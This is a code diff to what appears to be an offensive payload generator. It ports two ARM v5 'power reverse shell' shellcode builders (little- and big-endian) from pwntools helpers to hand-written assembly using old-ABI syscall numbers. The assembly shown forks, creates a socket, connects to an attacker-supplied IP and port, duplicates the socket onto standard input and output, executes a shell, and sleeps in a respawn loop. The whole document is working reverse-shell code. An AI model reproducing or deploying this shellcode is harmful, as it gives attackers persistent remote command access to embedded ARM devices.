@@ -2442,7 +2442,11 @@ def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep
 	main:
 	'''
 
-		shellcode += shellcraft.fork()
+		shellcode += """
+	mov     r7, #2
+	svc     0x900002
+
+		"""
 
 		shellcode += '''
 	mov r3,r0
@@ -2457,22 +2461,22 @@ def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #0
+	svc 0x900119
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #0
+	svc 0x90011b
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -2480,17 +2484,29 @@ def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #0
+	svc 0x90000b
 
 	'''
 
-		shellcode += shellcraft.exit(0)
+		shellcode += """
+	eor     r0, r0, r0
+	mov     r7, #1
+	svc     0x900000
+		"""
 
 		shellcode += '''
 main_lab:
 	'''
 
-		shellcode += shellcraft.wait4("r3")
+		shellcode += """
+mov     r0, r3
+eor     r1, r1, r1
+eor     r2, r2, r2
+eor     r3, r3, r3
+mov     r7, #114
+svc     0x900072
+
+		"""
 
 		shellcode += """
 ldr r10, ={time}
@@ -2499,7 +2515,7 @@ push {{r5}}
 push {{r10}}
 mov r0, sp
 mov r7, 0xa2
-svc #0
+svc 0x9000a2
 pop {{r5,r10}}
 	""".format(time=sleep_time)
 
@@ -2560,7 +2576,10 @@ nop
 	main:
 	'''
 
-		shellcode += shellcraft.fork()
+		shellcode += '''
+	mov     r7, #2
+	svc     0x900002
+		'''
 
 		shellcode += '''
 	mov r3,r0
@@ -2576,22 +2595,22 @@ nop
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #0
+	svc 0x900119
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #0
+	svc 0x90011b
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -2599,16 +2618,28 @@ nop
 	push {r0}
 	mov r1,sp
 	mov r7,#0xb
-	svc #0
+	svc 0x90000b
 
 	'''
-		shellcode += shellcraft.exit(0)
+		shellcode += """
+	eor     r0, r0, r0
+	mov     r7, #1
+	svc     0x900000
+		"""
 
 		shellcode += '''
 main_lab:
 	'''
 
-		shellcode += shellcraft.wait4("r3")
+		shellcode += """
+mov     r0, r3
+eor     r1, r1, r1
+eor     r2, r2, r2
+eor     r3, r3, r3
+mov     r7, #114
+svc     0x900072
+
+		"""
 
 		shellcode += """
 ldr r10, ={time}
@@ -2617,7 +2648,7 @@ push {{r5}}
 push {{r10}}
 mov r0, sp
 mov r7, 0xa2
-svc #0
+svc 0x9000a2
 	""".format(time=sleep_time)
 
 		shellcode += '''
@@ -2746,7 +2777,11 @@ def armebv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep
 	main:
 	'''
 
-		shellcode += shellcraft.fork()
+		shellcode += """
+	mov     r7, #2
+	svc     0x900002
+
+		"""
 
 		shellcode += '''
 	mov r3,r0
@@ -2761,22 +2796,22 @@ def armebv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc 0x900119
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc 0x90011b
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc 0x90003f
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -2784,15 +2819,27 @@ def armebv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc 0x90000b
 	'''
-		shellcode += shellcraft.exit(0)
+		shellcode += """
+	eor     r0, r0, r0
+	mov     r7, #1
+	svc     0x900000
+		"""
 
 		shellcode += '''
 main_lab:
 	'''
 
-		shellcode += shellcraft.wait4("r3")
+		shellcode += """
+	mov     r0, r3
+	eor     r1, r1, r1
+	eor     r2, r2, r2
+	eor     r3, r3, r3
+	mov     r7, #114
+	svc     0x900072
+
+		"""
 
 		shellcode += """
 ldr r10, ={time}
@@ -2801,7 +2848,7 @@ push {{r5}}
 push {{r10}}
 mov r0, sp
 mov r7, 0xa2
-svc #0
+svc 0x9000a2
 pop {{r5,r10}}
 	""".format(time=sleep_time)
 
@@ -2864,7 +2911,11 @@ nop
 	main:
 	'''
 
-		shellcode += shellcraft.fork()
+		shellcode += """
+	mov     r7, #2
+	svc     0x900002
+
+		"""
 
 		shellcode += '''
 	mov r3,r0
@@ -2880,22 +2931,22 @@ nop
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc 0x900119
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc 0x90011b
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc 0x90003f
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -2903,7 +2954,7 @@ nop
 	push {r0}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc 0x90000b
 	'''
 
 		shellcode += shellcraft.exit(0)
@@ -2912,7 +2963,15 @@ nop
 main_lab:
 	'''
 
-		shellcode += shellcraft.wait4("r3")
+		shellcode += """
+	mov     r0, r3
+	eor     r1, r1, r1
+	eor     r2, r2, r2
+	eor     r3, r3, r3
+	mov     r7, #114
+	svc     0x900072
+
+		"""
 
 		shellcode += """
 ldr r10, ={time}
@@ -2921,7 +2980,7 @@ push {{r5}}
 push {{r10}}
 mov r0, sp
 mov r7, 0xa2
-svc #0
+svc 0x9000a2
 pop {{r5,r10}}
 	""".format(time=sleep_time)
 
